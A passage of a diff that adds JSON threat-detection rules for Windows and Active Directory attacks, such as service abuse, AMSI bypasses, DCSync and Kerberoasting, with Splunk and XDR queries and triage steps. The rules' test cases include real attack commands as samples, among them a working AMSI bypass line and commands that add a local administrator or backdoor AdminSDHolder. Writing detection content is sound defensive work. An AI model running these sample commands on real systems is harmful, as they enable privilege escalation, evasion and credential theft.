+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"sc.exe\" and (action_process_image_command_line contains \"config\" and action_process_image_command_line contains \"binpath\")) or (action_process_image_command_line contains \"invoke-serviceabuse\" or action_process_image_command_line contains \"write-servicebinary\" or action_process_image_command_line contains \"install-servicebinary\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (lower(process_name)=\"sc.exe\" AND (match(CommandLine, \"(?i)config\") AND match(CommandLine, \"(?i)binpath\"))) OR (match(CommandLine, \"(?i)invoke\\\\-serviceabuse\") OR match(CommandLine, \"(?i)write\\\\-servicebinary\") OR match(CommandLine, \"(?i)install\\\\-servicebinary\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc config AbyssWebServer binPath= \"net localgroup administrators corp\\user /add\""
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Invoke-ServiceAbuse -Name AbyssWebServer -UserName corp\\user"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "sc.exe",
+      "process.command_line": "sc query AbyssWebServer"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0039",
+   "title": "SQL Server starts a shell (xp_cmdshell)",
+   "description": "sqlservr.exe starting cmd.exe or PowerShell means xp_cmdshell or a CLR assembly is running OS commands. Attackers reach it through database links, a sysadmin login, or a trustworthy database, and use it to move to the next server.",
+   "attack": [
+    "T1059.003",
+    "T1505.001"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "parent.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "sqlservr.exe"
+      ]
+     },
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "cmd.exe",
+       "powershell.exe",
+       "pwsh.exe",
+       "rundll32.exe",
+       "certutil.exe",
+       "bitsadmin.exe",
+       "whoami.exe"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "In the SQL Server logs, find the login that ran xp_cmdshell and any linked server queries (EXECUTE AT, OPENQUERY).",
+    "Disable xp_cmdshell, remove sysadmin from links, and run the SQL service as a low-privilege gMSA."
+   ],
+   "false_positives": [
+    "Maintenance jobs that call xp_cmdshell on purpose. They are scheduled and repeat the same command."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"sqlservr.exe\" and action_process_image_name in (\"cmd.exe\", \"powershell.exe\", \"pwsh.exe\", \"rundll32.exe\", \"certutil.exe\", \"bitsadmin.exe\", \"whoami.exe\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(parent_name)=\"sqlservr.exe\" AND (lower(process_name)=\"cmd.exe\" OR lower(process_name)=\"powershell.exe\" OR lower(process_name)=\"pwsh.exe\" OR lower(process_name)=\"rundll32.exe\" OR lower(process_name)=\"certutil.exe\" OR lower(process_name)=\"bitsadmin.exe\" OR lower(process_name)=\"whoami.exe\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "sqlservr.exe",
+      "process.name": "cmd.exe",
+      "process.command_line": "cmd.exe /c whoami"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.name": "sqlservr.exe",
+      "process.name": "sqlwriter.exe",
+      "process.command_line": "sqlwriter.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0040",
+   "title": ".NET profiler set to load a DLL (COR_PROFILER)",
+   "description": "Setting COR_ENABLE_PROFILING and COR_PROFILER in the Environment key makes every .NET process, including PowerShell, load a DLL of the attacker's choice. Tools such as InviShell use it to switch off PowerShell logging and AMSI for the user.",
+   "attack": [
+    "T1574.012",
+    "T1562.001"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "registry_set",
+   "selections": {
+    "profiler": [
+     {
+      "field": "registry.key",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "\\Environment"
+      ]
+     },
+     {
+      "field": "registry.value",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "COR_PROFILER",
+       "COR_ENABLE_PROFILING",
+       "COR_PROFILER_PATH"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "profiler"
+   },
+   "condition_text": "profiler",
+   "triage": [
+    "Read COR_PROFILER_PATH. A DLL in a user folder means a bypass, not an APM agent.",
+    "Expect missing PowerShell 4104 logs from that user after this point. Look at process creation instead."
+   ],
+   "false_positives": [
+    "Application performance monitoring agents (APM) that profile .NET apps. They set it machine-wide from their own installer."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.REGISTRY and event_sub_type = ENUM.REGISTRY_SET_VALUE\n| filter action_registry_key_name ~= \"(?i)\\\\\\\\Environment$\" and action_registry_value_name in (\"cor_profiler\", \"cor_enable_profiling\", \"cor_profiler_path\")\n| fields _time, agent_hostname, actor_process_image_name, action_registry_key_name, action_registry_value_name, action_registry_data\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=13\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), reg_key=replace(TargetObject,\"\\\\\\\\[^\\\\\\\\]*$\",\"\"), reg_value=mvindex(split(TargetObject,\"\\\\\"),-1)\n| where match(reg_key, \"(?i)\\\\\\\\Environment$\") AND (lower(reg_value)=\"cor_profiler\" OR lower(reg_value)=\"cor_enable_profiling\" OR lower(reg_value)=\"cor_profiler_path\")\n| table _time host Image TargetObject Details\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "reg.exe",
+      "registry.key": "HKU\\S-1-5-21-1-2-3-1107\\Environment",
+      "registry.value": "COR_PROFILER",
+      "registry.data": "{cf0d821e-299b-5307-a3d8-b283c03916db}"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "explorer.exe",
+      "registry.key": "HKU\\S-1-5-21-1-2-3-1107\\Environment",
+      "registry.value": "TEMP",
+      "registry.data": "C:\\Users\\x\\AppData\\Local\\Temp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0041",
+   "title": "DSRM administrator allowed to log on normally (DsrmAdminLogonBehavior)",
+   "description": "Setting DsrmAdminLogonBehavior to 2 lets the Directory Services Restore Mode administrator, a local account on every DC whose password rarely changes, log on over the network. An attacker who dumped that hash keeps a backdoor into the DC.",
+   "attack": [
+    "T1098",
+    "T1112"
+   ],
+   "tactic": "persistence",
+   "severity": "critical",
+   "logsource": "registry_set",
+   "selections": {
+    "dsrm": [
+     {
+      "field": "registry.key",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "\\Control\\Lsa"
+      ]
+     },
+     {
+      "field": "registry.value",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "DsrmAdminLogonBehavior"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "dsrm"
+   },
+   "condition_text": "dsrm",
+   "triage": [
+    "Set the value back to 0 or delete it, then reset the DSRM password on that DC (ntdsutil \"set dsrm password\").",
+    "Look for network logons by the DC's local Administrator account after the change."
+   ],
+   "false_positives": [
+    "Almost never set on purpose. A documented recovery procedure is the only reason."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.REGISTRY and event_sub_type = ENUM.REGISTRY_SET_VALUE\n| filter action_registry_key_name ~= \"(?i)\\\\\\\\Control\\\\\\\\Lsa$\" and action_registry_value_name = \"dsrmadminlogonbehavior\"\n| fields _time, agent_hostname, actor_process_image_name, action_registry_key_name, action_registry_value_name, action_registry_data\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=13\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), reg_key=replace(TargetObject,\"\\\\\\\\[^\\\\\\\\]*$\",\"\"), reg_value=mvindex(split(TargetObject,\"\\\\\"),-1)\n| where match(reg_key, \"(?i)\\\\\\\\Control\\\\\\\\Lsa$\") AND lower(reg_value)=\"dsrmadminlogonbehavior\"\n| table _time host Image TargetObject Details\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "registry.key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa",
+      "registry.value": "DsrmAdminLogonBehavior",
+      "registry.data": "DWORD (0x00000002)"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "lsass.exe",
+      "registry.key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa",
+      "registry.value": "LmCompatibilityLevel",
+      "registry.data": "DWORD (0x00000005)"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0042",
+   "title": "LSA protection or credential caching weakened in the registry",
+   "description": "Turning RunAsPPL off lets tools read LSASS memory again, and UseLogonCredential = 1 makes WDigest keep cleartext passwords in memory. Both prepare a host for credential theft.",
+   "attack": [
+    "T1562.001",
+    "T1003.001"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "registry_set",
+   "selections": {
+    "ppl_off": [
+     {
+      "field": "registry.key",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "\\Control\\Lsa"
+      ]
+     },
+     {
+      "field": "registry.value",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "RunAsPPL",
+       "RunAsPPLBoot"
+      ]
+     },
+     {
+      "field": "registry.data",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "0x00000000"
+      ]
+     }
+    ],
+    "wdigest_on": [
+     {
+      "field": "registry.key",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "\\SecurityProviders\\WDigest"
+      ]
+     },
+     {
+      "field": "registry.value",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "UseLogonCredential"
+      ]
+     },
+     {
+      "field": "registry.data",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "0x00000001"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "ppl_off"
+     },
+     {
+      "sel": "wdigest_on"
+     }
+    ]
+   },
+   "condition_text": "ppl_off or wdigest_on",
+   "triage": [
+    "Put the value back and reboot. Assume credentials on this host after the change are exposed."
+   ],
+   "false_positives": [
+    "Compatibility changes for old LSA plugins. These should be rare and change-managed."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.REGISTRY and event_sub_type = ENUM.REGISTRY_SET_VALUE\n| filter (action_registry_key_name ~= \"(?i)\\\\\\\\Control\\\\\\\\Lsa$\" and action_registry_value_name in (\"runasppl\", \"runaspplboot\") and action_registry_data contains \"0x00000000\") or (action_registry_key_name ~= \"(?i)\\\\\\\\SecurityProviders\\\\\\\\WDigest$\" and action_registry_value_name = \"uselogoncredential\" and action_registry_data contains \"0x00000001\")\n| fields _time, agent_hostname, actor_process_image_name, action_registry_key_name, action_registry_value_name, action_registry_data\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=13\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), reg_key=replace(TargetObject,\"\\\\\\\\[^\\\\\\\\]*$\",\"\"), reg_value=mvindex(split(TargetObject,\"\\\\\"),-1)\n| where (match(reg_key, \"(?i)\\\\\\\\Control\\\\\\\\Lsa$\") AND (lower(reg_value)=\"runasppl\" OR lower(reg_value)=\"runaspplboot\") AND match(Details, \"(?i)0x00000000\")) OR (match(reg_key, \"(?i)\\\\\\\\SecurityProviders\\\\\\\\WDigest$\") AND lower(reg_value)=\"uselogoncredential\" AND match(Details, \"(?i)0x00000001\"))\n| table _time host Image TargetObject Details\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "reg.exe",
+      "registry.key": "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+      "registry.value": "UseLogonCredential",
+      "registry.data": "DWORD (0x00000001)"
+     },
+     {
+      "process.name": "reg.exe",
+      "registry.key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa",
+      "registry.value": "RunAsPPL",
+      "registry.data": "DWORD (0x00000000)"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "reg.exe",
+      "registry.key": "HKLM\\System\\CurrentControlSet\\Control\\Lsa",
+      "registry.value": "RunAsPPL",
+      "registry.data": "DWORD (0x00000001)"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0043",
+   "title": "AMSI or ETW bypass in a PowerShell script block",
+   "description": "PowerShell script block logging (event 4104) records the code PowerShell actually ran, after decoding. Bypasses that switch off AMSI (amsiInitFailed, AmsiScanBuffer patching, amsi.dll tricks) or blind ETW (EtwEventWrite, PSEtwLogProvider) leave their strings here, even when the command line is obfuscated.",
+   "attack": [
+    "T1562.001"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "script_block": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4104"
+      ]
+     }
+    ],
+    "bypass": [
+     {
+      "field": "script.text",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "amsiinitfailed",
+       "amsiscanbuffer",
+       "amsiutils",
+       "amsicontext",
+       "amsiopensession",
+       "amsi.dll",
+       "etweventwrite",
+       "psetwlogprovider",
+       "cachedgrouppolicysettings"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "script_block"
+     },
+     {
+      "sel": "bypass"
+     }
+    ]
+   },
+   "condition_text": "script_block and bypass",
+   "triage": [
+    "Read the next script blocks from the same host and session. The bypass is the first step; the tool loaded after it is the real payload (DL-0044).",
+    "Check if the user also set COR_PROFILER (DL-0040) to hide later activity."
+   ],
+   "false_positives": [
+    "Security tools and training material that mention AMSI. Real bypasses use reflection on these names."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_script_text = json_extract_scalar(action_evtlog_data_fields, \"$.ScriptBlockText\")\n| filter action_evtlog_event_id = 4104 and (evt_script_text contains \"amsiinitfailed\" or evt_script_text contains \"amsiscanbuffer\" or evt_script_text contains \"amsiutils\" or evt_script_text contains \"amsicontext\" or evt_script_text contains \"amsiopensession\" or evt_script_text contains \"amsi.dll\" or evt_script_text contains \"etweventwrite\" or evt_script_text contains \"psetwlogprovider\" or evt_script_text contains \"cachedgrouppolicysettings\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4104 AND (match(ScriptBlockText, \"(?i)amsiinitfailed\") OR match(ScriptBlockText, \"(?i)amsiscanbuffer\") OR match(ScriptBlockText, \"(?i)amsiutils\") OR match(ScriptBlockText, \"(?i)amsicontext\") OR match(ScriptBlockText, \"(?i)amsiopensession\") OR match(ScriptBlockText, \"(?i)amsi\\\\.dll\") OR match(ScriptBlockText, \"(?i)etweventwrite\") OR match(ScriptBlockText, \"(?i)psetwlogprovider\") OR match(ScriptBlockText, \"(?i)cachedgrouppolicysettings\"))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4104,
+      "script.text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+     },
+     {
+      "event.id": 4104,
+      "script.text": "$m = [Reflection.Assembly]::LoadWithPartialName(\"System.Core\"); ... PSEtwLogProvider ... m_enabled"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4104,
+      "script.text": "Get-Service -Name WinDefend | Select-Object Status"
+     },
+     {
+      "event.id": 4688,
+      "script.text": "amsiInitFailed"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0044",
+   "title": "Offensive PowerShell toolkit loaded (PowerView, PowerUp, Invoke-Mimikatz)",
+   "description": "Script block logging (4104) shows the functions of well-known offensive toolkits when they are loaded in memory: PowerView, PowerUp, Invoke-Mimikatz, Invoke-Kerberoast, PowerUpSQL, Find-PSRemotingLocalAdminAccess. The command line often shows only IEX or a download cradle.",
+   "attack": [
+    "T1059.001",
+    "T1087.002",
+    "T1003.001"
+   ],
+   "tactic": "execution",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "script_block": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4104"
+      ]
+     }
+    ],
+    "toolkit": [
+     {
+      "field": "script.text",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "find-interestingdomainacl",
+       "invoke-sharefinder",
+       "get-domainobjectacl",
+       "invoke-userhunter",
+       "find-localadminaccess",
+       "invoke-allchecks",
+       "invoke-serviceabuse",
+       "invoke-mimikatz",
+       "invoke-kerberoast",
+       "get-sqlserverlinkcrawl",
+       "get-sqlinstancedomain",
+       "find-psremotinglocaladminaccess",
+       "invoke-portscan",
+       "function get-domainuser"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "script_block"
+     },
+     {
+      "sel": "toolkit"
+     }
+    ]
+   },
+   "condition_text": "script_block and toolkit",
+   "triage": [
+    "Rebuild the full script from consecutive 4104 events (same ScriptBlock ID) to see every function that ran.",
+    "Look for the AMSI bypass just before it (DL-0043) and the account that ran it."
+   ],
+   "false_positives": [
+    "Authorised tests. A few AD audit scripts reuse PowerView code."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_script_text = json_extract_scalar(action_evtlog_data_fields, \"$.ScriptBlockText\")\n| filter action_evtlog_event_id = 4104 and (evt_script_text contains \"find-interestingdomainacl\" or evt_script_text contains \"invoke-sharefinder\" or evt_script_text contains \"get-domainobjectacl\" or evt_script_text contains \"invoke-userhunter\" or evt_script_text contains \"find-localadminaccess\" or evt_script_text contains \"invoke-allchecks\" or evt_script_text contains \"invoke-serviceabuse\" or evt_script_text contains \"invoke-mimikatz\" or evt_script_text contains \"invoke-kerberoast\" or evt_script_text contains \"get-sqlserverlinkcrawl\" or evt_script_text contains \"get-sqlinstancedomain\" or evt_script_text contains \"find-psremotinglocaladminaccess\" or evt_script_text contains \"invoke-portscan\" or evt_script_text contains \"function get-domainuser\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4104 AND (match(ScriptBlockText, \"(?i)find\\\\-interestingdomainacl\") OR match(ScriptBlockText, \"(?i)invoke\\\\-sharefinder\") OR match(ScriptBlockText, \"(?i)get\\\\-domainobjectacl\") OR match(ScriptBlockText, \"(?i)invoke\\\\-userhunter\") OR match(ScriptBlockText, \"(?i)find\\\\-localadminaccess\") OR match(ScriptBlockText, \"(?i)invoke\\\\-allchecks\") OR match(ScriptBlockText, \"(?i)invoke\\\\-serviceabuse\") OR match(ScriptBlockText, \"(?i)invoke\\\\-mimikatz\") OR match(ScriptBlockText, \"(?i)invoke\\\\-kerberoast\") OR match(ScriptBlockText, \"(?i)get\\\\-sqlserverlinkcrawl\") OR match(ScriptBlockText, \"(?i)get\\\\-sqlinstancedomain\") OR match(ScriptBlockText, \"(?i)find\\\\-psremotinglocaladminaccess\") OR match(ScriptBlockText, \"(?i)invoke\\\\-portscan\") OR match(ScriptBlockText, \"(?i)function\\\\ get\\\\-domainuser\"))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4104,
+      "script.text": "function Find-InterestingDomainAcl { [CmdletBinding()] Param(...) }"
+     },
+     {
+      "event.id": 4104,
+      "script.text": "Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query \"exec master..xp_cmdshell 'whoami'\""
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4104,
+      "script.text": "Get-ADUser -Filter * -Properties LastLogonDate"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0045",
+   "title": "Security descriptor backdoor on WMI, PS Remoting, remote registry or AdminSDHolder",
+   "description": "Nishang and DAMP functions that quietly give an account remote access by editing security descriptors: Set-RemoteWMI, Set-RemotePSRemoting, Add-RemoteRegBackdoor, plus AdminSDHolder and DCSync rights added with PowerView. These are classic domain persistence techniques because nothing new is created, only permissions change.",
+   "attack": [
+    "T1098",
+    "T1546.003",
+    "T1112"
+   ],
+   "tactic": "persistence",
+   "severity": "critical",
+   "logsource": "windows_event",
+   "selections": {
+    "script_block": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4104"
+      ]
+     }
+    ],
+    "backdoor": [
+     {
+      "field": "script.text",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "set-remotewmi",
+       "set-remotepsremoting",
+       "add-remoteregbackdoor",
+       "get-remotemachineaccounthash",
+       "get-remotelocalaccounthash",
+       "get-remotecachedcredential",
+       "cn=adminsdholder",
+       "-rights dcsync",
+       "invoke-sdpropagator"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "script_block"
+     },
+     {
+      "sel": "backdoor"
+     }
+    ]
+   },
+   "condition_text": "script_block and backdoor",
+   "triage": [
+    "On the target host, review the security descriptors of root\\cimv2, the PSRemoting session configuration, and the winreg key.",
+    "Compare the AdminSDHolder ACL with a known good copy and remove unknown principals."
+   ],
+   "false_positives": [
+    "Very rare outside red team work."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_script_text = json_extract_scalar(action_evtlog_data_fields, \"$.ScriptBlockText\")\n| filter action_evtlog_event_id = 4104 and (evt_script_text contains \"set-remotewmi\" or evt_script_text contains \"set-remotepsremoting\" or evt_script_text contains \"add-remoteregbackdoor\" or evt_script_text contains \"get-remotemachineaccounthash\" or evt_script_text contains \"get-remotelocalaccounthash\" or evt_script_text contains \"get-remotecachedcredential\" or evt_script_text contains \"cn=adminsdholder\" or evt_script_text contains \"-rights dcsync\" or evt_script_text contains \"invoke-sdpropagator\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4104 AND (match(ScriptBlockText, \"(?i)set\\\\-remotewmi\") OR match(ScriptBlockText, \"(?i)set\\\\-remotepsremoting\") OR match(ScriptBlockText, \"(?i)add\\\\-remoteregbackdoor\") OR match(ScriptBlockText, \"(?i)get\\\\-remotemachineaccounthash\") OR match(ScriptBlockText, \"(?i)get\\\\-remotelocalaccounthash\") OR match(ScriptBlockText, \"(?i)get\\\\-remotecachedcredential\") OR match(ScriptBlockText, \"(?i)cn=adminsdholder\") OR match(ScriptBlockText, \"(?i)\\\\-rights\\\\ dcsync\") OR match(ScriptBlockText, \"(?i)invoke\\\\-sdpropagator\"))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4104,
+      "script.text": "Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace \"root\\cimv2\" -Verbose"
+     },
+     {
+      "event.id": 4104,
+      "script.text": "Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,dc=corp,dc=local\" -PrincipalIdentity student1 -Rights All"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4104,
+      "script.text": "Get-WmiObject -Class Win32_OperatingSystem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0046",
+   "title": "DCSync, directory replication requested by an account that is not a DC",
+   "description": "Event 4662 on a domain controller with the replication rights GUIDs (DS-Replication-Get-Changes and -All) means someone asked the DC to replicate secrets, the way mimikatz lsadump::dcsync works. Domain controllers do this all the time; a user account should never do it.",
+   "attack": [
+    "T1003.006"
+   ],
+   "tactic": "credential-access",
+   "severity": "critical",
+   "logsource": "windows_event",
+   "selections": {
+    "access": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4662"
+      ]
+     }
+    ],
+    "replication": [
+     {
+      "field": "object.properties",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
+       "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
+       "89e95b76-444d-4c62-991a-0facbeda640c"
+      ]
+     }
+    ],
+    "dc_account": [
+     {
+      "field": "subject.user",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "$"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "and": [
+       {
+        "sel": "access"
+       },
+       {
+        "sel": "replication"
+       }
+      ]
+     },
+     {
+      "not": {
+       "sel": "dc_account"
+      }
+     }
+    ]
+   },
+   "condition_text": "access and replication and not dc_account",
+   "triage": [
+    "Treat as domain compromise. Find the source IP from the matching 4624 logon on the DC.",
+    "Find out which account was replicated (krbtgt, Administrator, trust accounts). If krbtgt: plan a double reset.",
+    "Remove replication rights from any account that should not hold them (Get-DomainObjectAcl on the domain root)."
+   ],
+   "false_positives": [
+    "Azure AD Connect (MSOL_ accounts) and some backup or identity products replicate on purpose. Exclude them by name."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_object_properties = json_extract_scalar(action_evtlog_data_fields, \"$.Properties\")\n| filter (action_evtlog_event_id = 4662 and (evt_object_properties contains \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" or evt_object_properties contains \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" or evt_object_properties contains \"89e95b76-444d-4c62-991a-0facbeda640c\")) and not ((evt_subject_user != null and evt_subject_user ~= \"(?i)\\\\$$\"))\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where (EventCode=4662 AND (match(Properties, \"(?i)1131f6aa\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2\") OR match(Properties, \"(?i)1131f6ad\\\\-9c07\\\\-11d1\\\\-f79f\\\\-00c04fc2dcd2\") OR match(Properties, \"(?i)89e95b76\\\\-444d\\\\-4c62\\\\-991a\\\\-0facbeda640c\"))) AND NOT ((isnotnull(SubjectUserName) AND match(SubjectUserName, \"(?i)\\\\$$\")))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4662,
+      "subject.user": "studentx",
+      "object.type": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+      "object.properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4662,
+      "subject.user": "DCORP-DC$",
+      "object.properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"
+     },
+     {
+      "event.id": 4662,
+      "subject.user": "studentx",
+      "object.properties": "%%7684 {bf967a86-0de6-11d0-a285-00aa003049e2}"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0047",
+   "title": "Kerberos service ticket with RC4 for a user service account (Kerberoasting)",
+   "description": "Event 4769 with ticket encryption 0x17 (RC4) for a service that is not a computer account and not krbtgt. In a domain that uses AES, RC4 service tickets for user accounts with an SPN are what Kerberoasting tools request, because RC4 is the fastest to crack offline.",
+   "attack": [
+    "T1558.003"
+   ],
+   "tactic": "credential-access",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "tgs": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4769"
+      ]
+     },
+     {
+      "field": "ticket.encryption",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "0x17"
+      ]
+     }
+    ],
+    "machine_or_krbtgt": [
+     {
+      "field": "service.name",
+      "op": "endswith",
+      "all": false,
+      "values": [
+       "$"
+      ]
+     }
+    ],
+    "krbtgt": [
+     {
+      "field": "service.name",
+      "op": "startswith",
+      "all": false,
+      "values": [
+       "krbtgt"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "and": [
+       {
+        "sel": "tgs"
+       },
+       {
+        "not": {
+         "sel": "machine_or_krbtgt"
+        }
+       }
+      ]
+     },
+     {
